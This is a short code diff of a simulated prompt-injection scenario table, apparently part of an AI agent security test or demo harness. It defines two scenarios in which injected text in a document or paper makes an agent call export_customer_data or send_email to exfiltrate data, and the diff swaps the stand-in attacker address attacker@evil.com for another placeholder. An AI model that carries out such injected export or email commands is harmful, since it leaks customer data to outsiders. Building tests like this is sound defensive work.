@@ -341,7 +341,7 @@ SIMULATED_SCENARIOS = {
         "scenario_name": "Malicious Export Injection",
         "tool": "export_customer_data",
         "args_extractor": lambda text: {
-            "target_email": (re.search(r"[\w\.-]+@[\w\.-]+\.\w+", text).group(0) if re.search(r"[\w\.-]+@[\w\.-]+\.\w+", text) else "attacker@evil.com"),
+            "target_email": (re.search(r"[\w\.-]+@[\w\.-]+\.\w+", text).group(0) if re.search(r"[\w\.-]+@[\w\.-]+\.\w+", text) else "unauthorized_dest@untrusted-domain.com"),
             "records_count": 250
         },
         "detected_text": "Prompt injection directive in document"
@@ -361,7 +361,7 @@ SIMULATED_SCENARIOS = {
     "mixed_context": {
         "scenario_name": "Mixed Context Injection",
         "tool": "send_email",
-        "args_extractor": lambda text: {"target_email": "attacker@evil.com", "subject": "Data Exfiltration", "body": "Exfiltrated info"},
+        "args_extractor": lambda text: {"target_email": "unauthorized_dest@untrusted-domain.com", "subject": "Data Exfiltration", "body": "Exfiltrated info"},
         "detected_text": "Injected email command in paper text"
     }
 }
